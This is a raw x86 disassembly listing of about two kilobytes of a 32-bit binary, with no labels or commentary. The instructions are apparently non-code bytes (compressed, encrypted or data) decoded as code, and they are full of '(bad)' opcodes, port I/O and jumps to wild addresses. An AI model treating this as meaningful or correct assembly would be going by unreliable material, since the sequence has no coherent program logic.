  418a9f:	scas   eax,DWORD PTR es:[edi]
  418aa0:	pop    es
  418aa1:	popa   
  418aa2:	shl    BYTE PTR [ecx-0x1d],1
  418aa5:	add    BYTE PTR [eax],0x17
  418aa8:	cdq    
  418aa9:	mov    ebx,0xc2bd8d4e
  418aae:	adc    eax,0x7bb215d7
  418ab3:	sbb    eax,0x3cbb755
  418ab8:	std    
  418ab9:	jge    0x418ac5
  418abb:	adc    cl,ah
  418abd:	push   ecx
  418abe:	or     edi,esi
  418ac0:	xchg   edx,eax
  418ac1:	adc    eax,0xe4093be4
  418ac6:	rcr    DWORD PTR [edx-0x68d51f8c],0xdb
  418acd:	pop    esp
  418ace:	mov    esp,0xa901a98f
  418ad3:	mov    dl,0x3
  418ad5:	sbb    eax,0x933e05f8
  418ada:	push   ebx
  418adb:	sahf   
  418adc:	in     al,0xd9
  418ade:	pop    ecx
  418adf:	not    BYTE PTR [esi-0x7806b983]
  418ae5:	imul   eax,ebp,0xd05d3267
  418aeb:	ror    ch,0xf
  418aee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418aef:	outs   dx,DWORD PTR ds:[esi]
  418af0:	jnp    0x418b1d
  418af2:	push   esi
  418af3:	repz bound eax,QWORD PTR [ebx]
  418af6:	sbb    BYTE PTR [edi+ebx*4-0x5c],bl
  418afa:	xor    edi,edx
  418afc:	push   eax
  418afd:	ins    DWORD PTR es:[edi],dx
  418afe:	jb     0x418b33
  418b00:	dec    edi
  418b01:	xchg   edx,eax
  418b02:	imul   ecx,edi,0xa88a5f9d
  418b08:	sub    bh,ah
  418b0a:	dec    esi
  418b0b:	pop    edx
  418b0c:	adc    eax,0x9713e0e9
  418b11:	stc    
  418b12:	push   esp
  418b13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b14:	mov    dl,0x3f
  418b16:	mov    al,0x45
  418b18:	(bad)  
  418b19:	mov    dh,0xc8
  418b1b:	inc    esi
  418b1c:	mov    cl,0x23
  418b1e:	outs   dx,DWORD PTR ds:[esi]
  418b1f:	mov    ch,0x17
  418b21:	aam    0x54
  418b23:	ret    
  418b24:	fcom   QWORD PTR ds:0xc17e2a4e
  418b2a:	jns    0x418b63
  418b2c:	or     ah,BYTE PTR [edi]
  418b2e:	sub    bh,BYTE PTR [ebx+0x6b98f35f]
  418b34:	lds    ebx,FWORD PTR [ebp+0x23]
  418b37:	sbb    al,0x44
  418b39:	or     BYTE PTR [esi],dh
  418b3b:	aas    
  418b3c:	add    cl,BYTE PTR [eax-0x4b]
  418b3f:	mov    ds:0xd31531b,eax
  418b44:	stc    
  418b45:	retf   0x62c2
  418b48:	repz mov esi,0xa4ba745f
  418b4e:	js     0x418b7c
  418b50:	rcr    BYTE PTR [esi+0x2],0xb0
  418b54:	out    0x9c,eax
  418b56:	sub    eax,esp
  418b58:	js     0x418b06
  418b5a:	mov    ah,0xd5
  418b5c:	test   DWORD PTR [edx],ebp
  418b5e:	xlat   BYTE PTR ds:[ebx]
  418b5f:	sbb    BYTE PTR [esi-0x442559f8],dl
  418b65:	push   ebx
  418b66:	jae    0x418bc8
  418b68:	pushf  
  418b69:	xchg   ebp,eax
  418b6a:	pop    edx
  418b6b:	push   0xffffff90
  418b6d:	mov    ds:0xaa66c6e7,al
  418b72:	and    DWORD PTR [edi],ebx
  418b74:	add    al,0xba
  418b76:	or     BYTE PTR [edi-0x7b766819],bl
  418b7c:	xchg   ebx,eax
  418b7d:	jae    0x418bb9
  418b7f:	and    BYTE PTR [ebp+0x48a24b5],bh
  418b85:	jp     0x418b82
  418b87:	mov    ch,0xb4
  418b89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b8a:	xchg   DWORD PTR fs:[ebp-0x713eae0c],edi
  418b91:	iret   
  418b92:	idiv   DWORD PTR [edi-0x4a6379bc]
  418b98:	sbb    bh,BYTE PTR [ebx]
  418b9a:	dec    eax
  418b9b:	ret    
  418b9c:	cs aam 0xbc
  418b9f:	rcl    BYTE PTR [esi-0x4f403e70],0x27
  418ba6:	imul   ebx,DWORD PTR [edx],0xf
  418ba9:	fnstenv [ecx+0x22d2a502]
  418baf:	sbb    al,0xfe
  418bb1:	arpl   WORD PTR [edx],ax
  418bb3:	inc    DWORD PTR [esi-0x6b]
  418bb6:	jnp    0x418bf6
  418bb8:	mov    esp,0x63a7e57b
  418bbd:	xor    al,0x6b
  418bbf:	push   eax
  418bc0:	fcom   QWORD PTR [edx+0x4bd3e1f4]
  418bc6:	ja     0xa55c1923
  418bcc:	inc    ebx
  418bcd:	inc    ebx
  418bce:	cmp    al,0xd1
  418bd0:	(bad)  
  418bd1:	lock rcl edx,1
  418bd4:	jae    0x418c4d
  418bd6:	pop    ecx
  418bd7:	bswap  esp
  418bd9:	(bad)  [eax-0x7a]
  418bdc:	gs in  al,0xba
  418bdf:	(bad)  
  418be0:	loopne 0x418bc3
  418be2:	cmc    
  418be3:	popf   
  418be4:	or     cl,bh
  418be6:	mov    ebx,0x2e461d4d
  418beb:	mov    dh,BYTE PTR [ebp-0x31e902d8]
  418bf1:	mov    eax,0xe4380365
  418bf6:	mov    cl,0xc2
  418bf8:	xor    BYTE PTR [eax-0x542c0ae1],bl
  418bfe:	xchg   BYTE PTR [ebx],bh
  418c00:	xlat   BYTE PTR ds:[ebx]
  418c01:	sbb    al,0x78
  418c03:	jns    0x418b97
  418c05:	sbb    DWORD PTR [edi-0x5d7212b7],esp
  418c0b:	jecxz  0x418b9d
  418c0d:	pushf  
  418c0e:	ja     0x418c30
  418c10:	pop    ss
  418c11:	and    DWORD PTR [eax],esi
  418c13:	bound  esi,QWORD PTR [ebp+0x58e23400]
  418c19:	xor    esi,DWORD PTR [edi]
  418c1b:	imul   ecx,DWORD PTR [edi+0x2f],0xffffffe9
  418c1f:	(bad)  
  418c20:	in     eax,dx
  418c21:	js     0x418c05
  418c23:	dec    esp
  418c24:	or     eax,0x7052fd81
  418c29:	cld    
  418c2a:	xor    BYTE PTR [ecx-0x317aed42],ah
  418c30:	mov    cl,0xaf
  418c32:	adc    esp,DWORD PTR [edi-0x42653ec5]
  418c38:	ror    DWORD PTR [eax+ebx*1],cl
  418c3b:	js     0x418c6b
  418c3d:	cmp    DWORD PTR [edx],esp
  418c3f:	imul   edx,DWORD PTR [ecx+eiz*2],0x92e88283
  418c46:	inc    ecx
  418c47:	loope  0x418bdf
  418c49:	sahf   
  418c4a:	repz out dx,al
  418c4c:	and    DWORD PTR [eax+0x3f],edi
  418c4f:	inc    esp
  418c50:	jecxz  0x418c5a
  418c52:	les    esi,FWORD PTR [ebx-0x4ed47e97]
  418c58:	mov    esp,0xb447010e
  418c5d:	(bad)  
  418c5e:	ds jns 0x418c13
  418c61:	(bad)  
  418c62:	adc    eax,ebx
  418c64:	xor    BYTE PTR [esi+edi*2-0x531211af],al
  418c6b:	nop
  418c6c:	out    dx,al
  418c6d:	test   eax,0x66ea7e0f
  418c72:	jmp    0x418c27
  418c74:	cmp    eax,0x5885592a
  418c79:	cs test eax,0xf49c29e2
  418c7f:	push   ecx
  418c80:	loop   0x418c6c
  418c82:	in     al,0x3b
  418c84:	add    DWORD PTR [ebp-0x4f6dff13],0x7361a196
  418c8e:	(bad)  
  418c90:	pusha  
  418c91:	xlat   BYTE PTR ds:[ebx]
  418c92:	in     al,dx
  418c93:	mov    edi,0x56f873aa
  418c98:	hlt    
  418c99:	xchg   edi,eax
  418c9a:	mov    ebx,0x97ea0843
  418c9f:	adc    dl,bh
  418ca1:	xor    bl,cl
  418ca3:	mov    al,ds:0x79a38c0a
  418ca8:	push   0x3378d601
  418cad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cae:	mov    bl,BYTE PTR [ecx-0x2]
  418cb1:	por    mm2,mm5
  418cb4:	aad    0xd1
  418cb6:	xchg   esi,eax
  418cb7:	ss mov ecx,0xddc63278
  418cbd:	mov    cs,WORD PTR [ecx]
  418cbf:	pop    esi
  418cc0:	das    
  418cc1:	adc    edi,DWORD PTR [esi+0x32]
  418cc4:	xor    ebp,DWORD PTR [ebx+0x420b74a]
  418cca:	sti    
  418ccb:	or     ah,0x34
  418cce:	sbb    ch,BYTE PTR [edx-0x39297bf1]
  418cd4:	adc    BYTE PTR [ebx+0x275ad4be],ah
  418cda:	xchg   edx,eax
  418cdb:	addr16 aam 0x5e
  418cde:	bound  edi,QWORD PTR [edi]
  418ce0:	aaa    
  418ce1:	mov    ds:0x95b3509,eax
  418ce6:	cmp    ebp,ebx
  418ce8:	mov    bl,0x8d
  418cea:	sahf   
  418ceb:	mov    gs,WORD PTR [edx]
  418ced:	into   
  418cee:	fimul  DWORD PTR [edi]
  418cf0:	and    BYTE PTR [esi+0x61],dh
  418cf3:	sbb    al,0x5d
  418cf5:	jnp    0x418cde
  418cf7:	ret    
  418cf8:	mov    bh,0xd0
  418cfa:	fdivrp st(1),st
  418cfc:	xor    al,0xd3
  418cfe:	fimul  DWORD PTR [eax]
  418d00:	in     al,0x13
  418d02:	add    edi,DWORD PTR [ecx-0x7116b2a]
  418d08:	lock out 0xeb,eax
  418d0b:	gs push ebp
  418d0d:	jg     0x418c93
  418d0f:	imul   eax,edx,0x6470b0a8
  418d15:	mov    ebp,0x7097b3b6
  418d1a:	fdiv   st,st(5)
  418d1c:	test   al,0x27
  418d1e:	mov    ch,0xb0
  418d20:	fwait
  418d21:	inc    esp
  418d22:	xor    esi,DWORD PTR [ecx-0x41a55ade]
  418d28:	xchg   ebx,eax
  418d29:	sbb    eax,0xb1bde5b
  418d2e:	jmp    FWORD PTR [edx+0x3b]
  418d31:	or     BYTE PTR [ecx],al
  418d33:	and    ebp,DWORD PTR [eax+0x3e340b8]
  418d39:	stc    
  418d3a:	sbb    ebx,ecx
  418d3c:	stos   DWORD PTR es:[edi],eax
  418d3d:	ror    BYTE PTR [ecx-0x61],1
  418d40:	sbb    DWORD PTR [eax-0x6fbbf30e],esi
  418d46:	pusha  
  418d47:	mov    al,0xa4
  418d4a:	pusha  
  418d4b:	fstp   TBYTE PTR [ebp*2+0x63c01adb]
  418d52:	push   ebp
  418d53:	pop    es
  418d54:	icebp  
  418d55:	xchg   edx,eax
  418d56:	pushf  
  418d57:	cmp    dl,dh
  418d59:	mov    dh,0x75
  418d5b:	xor    DWORD PTR [ecx-0x31ae50bd],edi
  418d61:	fnstsw WORD PTR [esi+0x6d]
  418d64:	loopne 0x418d1b
  418d66:	inc    DWORD PTR [eax-0x3e40f290]
  418d6c:	nop
  418d6d:	jg     0x418d1b
  418d6f:	in     al,0xd3
  418d71:	loop   0x418d28
  418d73:	jp     0x418d5e
  418d75:	lahf   
  418d76:	ja     0x418d85
  418d78:	dec    edi
  418d79:	call   0x76fe711a
  418d7e:	pushf  
  418d7f:	push   esi
  418d80:	call   0x402a3043
  418d85:	mov    dl,0xeb
  418d87:	sahf   
  418d88:	fild   WORD PTR [edx+0x30657dd7]
  418d8e:	dec    esp
  418d8f:	mov    esi,0x9175c9db
  418d94:	inc    ebp
  418d95:	out    dx,eax
  418d96:	pop    ss
  418d97:	push   edi
  418d98:	lock xchg esp,eax
  418d9a:	add    ebx,eax
  418d9c:	fdivr  QWORD PTR [esi+0x6c44b2d9]
  418da2:	fcom   QWORD PTR [edi+edi*4-0x4457cc8a]
  418da9:	jg     0x418e1e
  418dab:	aad    0x7f
  418dad:	jns    0x418e12
  418daf:	mov    al,0xef
  418db1:	mov    al,0x1a
  418db3:	pop    edx
  418db4:	pop    esi
  418db5:	call   0x4033:0xe14d1d2f
  418dbc:	sub    eax,0x135811ce
  418dc1:	(bad)  
  418dc2:	jb     0x418da1
  418dc4:	inc    edx
  418dc5:	xor    cl,BYTE PTR [ebx+0x78]
  418dc8:	ret    0xbc9a
  418dcb:	xor    DWORD PTR [ecx],0x32bd97dd
  418dd1:	(bad)  
  418dd2:	stos   BYTE PTR es:[edi],al
  418dd3:	xchg   ebx,eax
  418dd4:	mov    dh,BYTE PTR [edi+0x74]
  418dd7:	add    BYTE PTR [esp+edi*4-0x3b07b82b],cl
  418dde:	xor    BYTE PTR [ebx-0x66],bl
  418de1:	xor    al,0x5b
  418de3:	retf   0x2790
  418de6:	aaa    
  418de7:	adc    BYTE PTR [ebx],0xc0
  418dea:	xchg   ebx,eax
  418deb:	push   ecx
  418dec:	repnz dec eax
  418dee:	push   cs
  418def:	sbb    ah,BYTE PTR [ebx+edi*8+0x2a2fda32]
  418df6:	sub    ch,BYTE PTR [ebx-0x657451f]
  418dfc:	pop    eax
  418dfd:	sub    DWORD PTR [esi+0x62660f5],eax
  418e03:	and    eax,0x1d405030
  418e08:	pop    ss
  418e09:	(bad)  
  418e0a:	cli    
  418e0b:	xor    al,0xfd
  418e0d:	out    0x6c,eax
  418e0f:	jno    0x418dda
  418e11:	add    DWORD PTR [edx+0x204f390c],eax
  418e17:	int    0x65
  418e19:	cli    
  418e1a:	jmp    0xd122:0x70f761f8
  418e21:	adc    cl,BYTE PTR [esi+0x39e18876]
  418e27:	shr    BYTE PTR [edx+0x11],1
  418e2a:	push   ss
  418e2b:	sti    
  418e2c:	ja     0x418e96
  418e2e:	xlat   BYTE PTR ds:[ebx]
  418e2f:	clc    
  418e30:	call   0x94c5c481
  418e35:	push   esi
  418e36:	loopne 0x418e2e
  418e38:	jle    0x418e2e
  418e3a:	push   ebp
  418e3b:	out    dx,al
  418e3c:	mov    edi,0xec0907cf
  418e41:	xlat   BYTE PTR ds:[ebx]
  418e42:	pop    edx
  418e43:	out    dx,eax
  418e44:	cld    
  418e45:	pop    es
  418e46:	xlat   BYTE PTR ds:[ebx]
  418e47:	sti    
  418e48:	pop    ebp
  418e49:	adc    edx,DWORD PTR [ecx]
  418e4b:	push   eax
  418e4c:	sub    eax,0x53f3db5e
  418e51:	xor    DWORD PTR [edx],eax
  418e53:	xor    DWORD PTR [esi],ebx
  418e55:	enter  0xd4e3,0xeb
  418e59:	in     al,0x31
  418e5b:	rcr    DWORD PTR [ecx-0xa45418f],0xbf
  418e62:	lahf   
  418e63:	outs   dx,BYTE PTR ds:[esi]
  418e64:	bound  ecx,QWORD PTR [edi]
  418e66:	loope  0x418e28
  418e68:	(bad)  
  418e69:	jmp    0xd30f95f8
  418e6e:	sub    ebp,0x4
  418e71:	pop    esi
  418e72:	aad    0x97
  418e74:	std    
  418e75:	jecxz  0x418e1a
  418e77:	dec    esi
  418e78:	iret   
  418e79:	xor    BYTE PTR [esp+edi*4],dl
  418e7c:	mov    cl,0x3e
  418e7e:	lahf   
  418e7f:	outs   dx,DWORD PTR ds:[esi]
  418e80:	push   esi
  418e81:	dec    edi
  418e82:	fistp  WORD PTR [edi+0x6d2c0bda]
  418e88:	pop    ecx
  418e89:	jg     0x418ed4
  418e8b:	or     ecx,DWORD PTR [eax+0x41]
  418e8e:	sub    ecx,edx
  418e90:	lods   al,BYTE PTR ds:[esi]
  418e91:	or     cl,ah
  418e93:	adc    eax,0x50060705
  418e98:	pop    esi
  418e99:	and    esp,DWORD PTR [esi]
  418e9b:	int    0x66
  418e9d:	retf   0x76d6
  418ea0:	xchg   ebp,eax
  418ea1:	in     al,0x2e
  418ea3:	pop    ds
  418ea4:	jg     0x418e44
  418ea6:	mov    DWORD PTR [ebp+0x54],ecx
  418ea9:	jmp    0xd4fd:0xce4b40db
  418eb0:	fs hlt 
  418eb2:	(bad)  
  418eb3:	mov    ebx,0xcfc116d4
  418eb8:	and    DWORD PTR ds:0x57abebc9,0xb753d141
  418ec2:	xor    bh,BYTE PTR [eax]
  418ec4:	addr16 mov esp,0x93467dae
  418eca:	xor    eax,0x7c500e46
  418ecf:	sbb    esi,DWORD PTR [edx]
  418ed1:	jg     0x418eb2
  418ed3:	or     ah,cl
  418ed5:	pushf  
  418ed6:	ret    0xc4c4
  418ed9:	adc    eax,0x46880d1a
  418ede:	into   
  418edf:	(bad)  
  418ee0:	adc    al,0xae
  418ee2:	pop    es
  418ee3:	jbe    0x418ea8
  418ee5:	out    dx,al
  418ee6:	sar    BYTE PTR [esi+0x55],cl
  418ee9:	shl    BYTE PTR [esi+0x4fe859ff],0x43
  418ef0:	mov    ebp,0x735ea1ef
  418ef5:	push   ss
  418ef6:	pop    esp
  418ef7:	add    BYTE PTR [eax],cl
  418ef9:	dec    esi
  418efa:	jecxz  0x418f35
  418efc:	dec    esi
  418efd:	dec    edi
  418efe:	sub    edx,DWORD PTR [bp+si-0x4d]
  418f02:	(bad)  
  418f04:	ds cmp al,0x1e
  418f07:	push   ds
  418f08:	inc    edx
  418f09:	stos   BYTE PTR es:[edi],al
  418f0a:	and    eax,0x1592d1d2
  418f0f:	shr    DWORD PTR [eax+0x2b],0x4e
  418f13:	xchg   esi,eax
  418f14:	adc    al,0x89
  418f16:	dec    esp
  418f17:	jle    0x418f84
  418f19:	mov    esp,0xa0d32e
  418f1e:	sbb    bh,al
  418f20:	xchg   edx,eax
  418f21:	xor    al,0x79
  418f23:	icebp  
  418f24:	sbb    eax,0x79b30281
  418f29:	xor    eax,0x8ff2f4da
  418f2e:	data16 jnp 0x418f1e
  418f31:	mov    esi,esp
  418f33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f34:	or     ecx,DWORD PTR [ebp-0x2422615b]
  418f3a:	repz xchg esp,eax
  418f3c:	scas   al,BYTE PTR es:[edi]
  418f3d:	aaa    
  418f3e:	aad    0x5d
  418f40:	mov    esi,0x9e98df3
  418f45:	adc    al,0xc8
  418f47:	cmp    ah,al
  418f49:	mov    eax,ds:0xfbfe7bf3
  418f4e:	xchg   ebp,eax
  418f4f:	dec    eax
  418f50:	dec    ecx
  418f51:	int    0xed
  418f53:	mov    eax,0x7a9448a4
  418f58:	bound  ebx,QWORD PTR [edx+0x63b6feb5]
  418f5e:	gs pop edi
  418f60:	push   cs
  418f61:	fidiv  DWORD PTR [esi-0x5a]
  418f64:	(bad)  
  418f65:	jl     0x418fc4
  418f67:	xor    eax,0x74a31e23
  418f6c:	stc    
  418f6d:	retf   
  418f6e:	mov    ebp,0x806faeaf
  418f73:	ror    bl,0x9d
  418f76:	scas   al,BYTE PTR es:[edi]
  418f77:	mov    al,0xa3
  418f79:	adc    ebx,ebp
  418f7b:	xchg   esi,eax
  418f7c:	jbe    0x418fea
  418f7e:	in     al,dx
  418f7f:	pop    eax
  418f80:	loopne 0x418fa6
  418f82:	pop    DWORD PTR cs:[edx]
  418f85:	inc    ebp
  418f86:	adc    eax,0x73463191
  418f8b:	test   eax,0x2085edd1
  418f90:	and    bh,cl
  418f92:	call   0x8691e615
  418f97:	dec    edi
  418f98:	call   0x9019a6f1
  418f9d:	sar    BYTE PTR [edi],0xa5
  418fa0:	mov    cl,0xce
  418fa2:	and    DWORD PTR [ebp+0x13],ecx
  418fa5:	mov    ds:0x425b33dd,al
  418faa:	mov    bl,0x1a
  418fac:	pop    esp
  418fad:	push   esp
  418fae:	mov    eax,0x3e4375da
  418fb3:	jg     0x41901b
  418fb5:	jecxz  0x418fac
  418fb7:	pop    eax
  418fb8:	bound  ebx,QWORD PTR [eax-0x10]
  418fbb:	mov    edi,DWORD PTR [ebx]
  418fbd:	adc    DWORD PTR [edx+0x28],edx
  418fc0:	in     al,0x91
  418fc2:	or     dh,cl
  418fc4:	push   ebx
  418fc5:	inc    edi
  418fc6:	rol    DWORD PTR [ebp+0x2cd9af97],1
  418fcc:	push   eax
  418fcd:	mov    esp,edi
  418fcf:	or     bh,BYTE PTR [edx+0x7e]
  418fd2:	fcomip st,st(0)
  418fd4:	lock pop edx
  418fd6:	std    
  418fd7:	inc    esi
  418fd8:	or     bl,bh
  418fda:	push   0xffffff82
  418fdc:	cmp    esp,DWORD PTR [ecx-0x76]
  418fdf:	imul   ebp,DWORD PTR [ebx+edx*8],0x87a67856
  418fe6:	gs push ebx
  418fe8:	lds    ebx,FWORD PTR [eax+0x7c]
  418feb:	sub    eax,0x69dea6c0
  418ff0:	jo     0x419033
  418ff2:	mov    BYTE PTR [edi+esi*1-0x754d648d],bh
  418ff9:	mov    al,ds:0xcd35f23f
  418ffe:	mov    ah,0xa3
  419000:	imul   ebp,DWORD PTR [edi],0x5f03240
  419006:	adc    al,0xc0
  419008:	leave  
  419009:	scas   al,BYTE PTR es:[edi]
  41900a:	add    esi,DWORD PTR [ebx-0x6a]
  41900d:	sbb    edx,DWORD PTR [esi-0x32]
  419010:	sar    BYTE PTR ds:0x43c2c32,0x71
  419017:	jg     0x419065
  419019:	fs cs mov eax,0x7e2e7682
  419020:	pop    edx
  419021:	push   esp
  419022:	retf   0xf750
  419025:	or     al,0xf6
  419027:	ss aas 
  419029:	add    DWORD PTR [edi-0x4456868b],ebx
  41902f:	jno    0x418fd2
  419031:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419032:	jne    0x418fef
  419034:	pop    ebp
  419035:	mov    bh,0xc9
  419037:	sbb    eax,0xe6b925ab
  41903c:	push   edi
  41903d:	jmp    0x8cdb:0xeb0b5de3
  419044:	inc    edx
  419045:	jp     0x41902a
  419047:	lds    esp,FWORD PTR [edi+eax*1]
  41904a:	enter  0xb828,0x6b
  41904e:	call   0x24976d95
  419053:	inc    edx
  419054:	cmp    dh,BYTE PTR [esi+esi*4+0x6a94fa68]
  41905b:	inc    ecx
  41905c:	out    0xaa,al
  41905e:	nop
  41905f:	jl     0x419078
  419061:	pop    ss
  419062:	jnp    0x4190dc
  419064:	scas   eax,DWORD PTR es:[edi]
  419065:	mov    DWORD PTR ss:[ebx-0x60ee85a8],esp
  41906c:	repz push 0x15d21c41
  419072:	adc    eax,0x8ec6ba67
  419077:	scas   eax,DWORD PTR es:[edi]
  419078:	xor    DWORD PTR [eax],edi
  41907a:	dec    ebp
  41907b:	push   ds
  41907c:	fnstsw WORD PTR [edi-0x226edb40]
  419082:	sbb    al,0x95
  419084:	xchg   BYTE PTR [eax],bl
  419086:	dec    esp
  419087:	jmp    0x51fb:0x8798851
  41908e:	stos   BYTE PTR es:[edi],al
  41908f:	mov    bh,0x8f
  419091:	push   0xffffffab
  419093:	jae    0x4190af
  419095:	mov    ebp,0x42e7c66
  41909a:	xchg   ch,cl
  41909c:	js     0x419022
  41909e:	outs   dx,BYTE PTR ds:[esi]
  41909f:	pop    ebp
  4190a0:	test   BYTE PTR [ebp+0x9],ch
  4190a3:	je     0x4190b4
  4190a5:	cmp    DWORD PTR [eax],edx
  4190a7:	dec    eax
  4190a8:	repz mov eax,ds:0x1831e498
  4190ae:	jne    0x41911c
  4190b0:	ins    BYTE PTR es:[edi],dx
  4190b1:	lock out 0xdf,al
  4190b4:	xor    eax,0x6f5555af
  4190b9:	sti    
  4190ba:	mov    eax,ds:0x6df40ee7
  4190bf:	test   eax,0x96b3a3a3
  4190c4:	jge    0x419142
  4190c6:	adc    edx,DWORD PTR [ecx+eiz*1]
  4190c9:	retf   
  4190ca:	not    ebx
  4190cc:	retf   0x2097
  4190cf:	mov    es,WORD PTR [esi]
  4190d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190d2:	(bad)
  4190d5:	inc    ebx
  4190d6:	repz adc edx,DWORD PTR [eax]
  4190d9:	and    DWORD PTR [edx-0x6829e68f],ebx
  4190df:	adc    al,0xd2
  4190e1:	sar    BYTE PTR [esi],0x71
  4190e4:	sbb    ah,BYTE PTR [ecx-0x8]
  4190e7:	push   0xffffff98
  4190e9:	sub    DWORD PTR [edx+eax*4-0x2205cbe0],ecx
  4190f0:	ret    0xbb
  4190f3:	fcmovnbe st,st(3)
  4190f5:	mov    WORD PTR [ebx],cs
  4190f7:	or     al,0xa5
  4190f9:	inc    edx
  4190fa:	repz push 0x2ec4f2e8
  419100:	rcr    DWORD PTR [edi-0x1ff906f7],1
  419106:	ss popa 
  419108:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419109:	adc    al,0xf9
  41910b:	rol    BYTE PTR [ecx],0x1c
  41910e:	lods   al,BYTE PTR ds:[esi]
  41910f:	cs xchg ebp,eax
  419111:	mov    ebp,esi
  419113:	xor    DWORD PTR [ebx-0x2],ebp
  419116:	inc    esi
  419117:	fwait
  419118:	ja     0x4190d6
  41911a:	add    BYTE PTR [ebp-0x79159c11],ch
  419120:	cld    
  419121:	shl    ebp,cl
  419123:	sbb    DWORD PTR [ebx],eax
  419125:	outs   dx,DWORD PTR ds:[esi]
  419126:	xlat   BYTE PTR ds:[ebx]
  419127:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419128:	fdivr  QWORD PTR [edx]
  41912a:	push   edi
  41912b:	(bad)  
  41912c:	aas    
  41912d:	rcr    BYTE PTR [ecx-0x5a],cl
  419130:	mov    ah,0x5e
  419132:	push   eax
  419133:	(bad)  
  419134:	in     al,dx
  419135:	inc    esp
  419136:	icebp  
  419137:	and    eax,0x1897c955
  41913c:	ins    DWORD PTR es:[edi],dx
  41913d:	mov    dl,0xf1
  41913f:	aas    
  419140:	adc    eax,0x56e49396
  419145:	stc    
  419146:	inc    eax
  419147:	sub    ch,BYTE PTR [edi]
  419149:	fidivr DWORD PTR [edi+0x34]
  41914c:	jp     0x4190f1
  41914e:	xor    edi,DWORD PTR [ecx-0x53]
  419151:	or     eax,0x2595a184
  419156:	mov    esp,0x40c16312
  41915b:	xor    dh,BYTE PTR [esi+0x1e091174]
  419161:	mov    WORD PTR [ecx-0x2c],es
  419164:	inc    esi
  419165:	add    esi,DWORD PTR [edi]
  419167:	outs   dx,BYTE PTR ds:[esi]
  419168:	mov    dh,0x25
  41916a:	pop    esi
  41916b:	xchg   edx,eax
  41916c:	cld    
  41916d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41916f:	adc    BYTE PTR [ebp+0x2d47e3fa],ah
  419175:	outs   dx,DWORD PTR ds:[esi]
  419176:	add    ch,bl
  419178:	jo     0x41916b
  41917a:	mov    cl,0x37
  41917c:	ins    BYTE PTR es:[edi],dx
  41917d:	push   ecx
  41917e:	mov    BYTE PTR [ecx],0x59
  419181:	test   al,0x9e
  419183:	pop    es
  419184:	and    eax,0xa6615ecc
  419189:	(bad)  
  41918a:	imul   DWORD PTR [ecx-0x2b341f3f]
  419190:	lea    edi,[edx+ebx*1+0x69]
  419194:	stos   BYTE PTR es:[edi],al
  419195:	rol    DWORD PTR [edx+edi*4-0x62be46a2],0xa5
  41919d:	hlt    
  41919e:	pop    es
  41919f:	mov    edi,0xc0033530
  4191a4:	jb     0x419146
  4191a6:	jp     0x419203
  4191a8:	icebp  
  4191a9:	dec    esi
  4191aa:	pushf  
  4191ab:	dec    edx
  4191ac:	retf   0x4dab
  4191af:	icebp  
  4191b0:	xchg   ebx,ecx
  4191b2:	push   0xea41512c
  4191b7:	iret   
  4191b8:	repz loopne 0x41914d
  4191bb:	in     al,dx
  4191bc:	cmp    DWORD PTR ds:0x3956f7d2,ecx
  4191c2:	stc    
  4191c3:	cld    
  4191c4:	pop    ds
  4191c5:	jecxz  0x4191e2
  4191c7:	fwait
  4191c8:	and    BYTE PTR [ebp+eiz*4-0xf5b82aa],al
  4191cf:	daa    
  4191d0:	xor    al,0x8a
  4191d2:	add    DWORD PTR [ecx-0x37e2617a],0x25
  4191d9:	mov    esp,0x59a9e54
  4191de:	sub    eax,0x502729f9
  4191e3:	arpl   WORD PTR [edi],bp
  4191e5:	ins    DWORD PTR es:[edi],dx
  4191e6:	cmp    bl,bh
  4191e8:	mov    dh,0xb9
  4191ea:	mov    ch,bl
  4191ec:	(bad)  
  4191ed:	frstor [edi+edx*2-0x1b]
  4191f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191f2:	clc    
  4191f3:	sbb    bh,bl
  4191f5:	push   esp
  4191f6:	data16 jne 0x41918d
  4191f9:	jg     0x4191a1
  4191fb:	or     ecx,esi
  4191fd:	jno    0x4191b6
  4191ff:	mov    dh,0x33
  419201:	into   
  419202:	jno    0x4191d1
  419204:	test   DWORD PTR [ecx+0x398e6944],esp
  41920a:	lea    eax,[edx]
  41920c:	mov    eax,ds:0x20ed2d1b
  419211:	adc    ebp,ebp
  419213:	sub    dl,ah
  419215:	xchg   esp,eax
  419216:	add    BYTE PTR [edx-0x35],bl
  419219:	inc    esi
  41921a:	xchg   edx,eax
  41921b:	mov    bl,0x75
  41921d:	mov    edx,0xb69c9a56
  419222:	(bad)  
  419223:	mov    WORD PTR [ebx-0x5787aec9],cs
  419229:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41922a:	sbb    BYTE PTR [ecx-0x5fc4ac0c],cl
  419230:	enter  0xd997,0x28
  419234:	inc    eax
  419235:	push   edx
  419236:	pop    eax
  419237:	and    ebp,DWORD PTR [edi+ebx*1+0x41]
  41923b:	push   ebp
  41923c:	mov    cl,0x7b
  41923e:	push   0xf008b383
  419243:	iret   
  419244:	or     DWORD PTR [eax+0x69],edx
  419247:	xchg   ecx,eax
  419248:	arpl   WORD PTR [ecx],dx
  41924a:	in     al,0x3
  41924c:	inc    edx
  41924d:	loopne 0x419231
  41924f:	mov    ecx,0x5545908a
  419254:	xor    bl,ch
  419256:	nop
  419257:	jns    0x4191fc
  419259:	scas   eax,DWORD PTR es:[edi]
  41925a:	jno    0x4191f4
  41925c:	mov    DWORD PTR [edx+0x74],edx
  41925f:	in     al,0xc4
  419261:	mov    ds:0x6011b6f,eax
  419266:	push   ecx
  419267:	pop    esp
  419268:	mov    al,ds:0x3a190bff
  41926d:	inc    ebp
  41926e:	sub    BYTE PTR [edx-0x7],0x1c
  419272:	xchg   ecx,eax
  419273:	adc    bl,BYTE PTR [edi-0x52f4424d]
  419279:	cmc    
  41927a:	rcl    DWORD PTR [ecx+0x3b372a96],0x11
  419281:	data16 jge 0x4192d7
  419284:	int3   
  419285:	or     eax,0xc077e36a
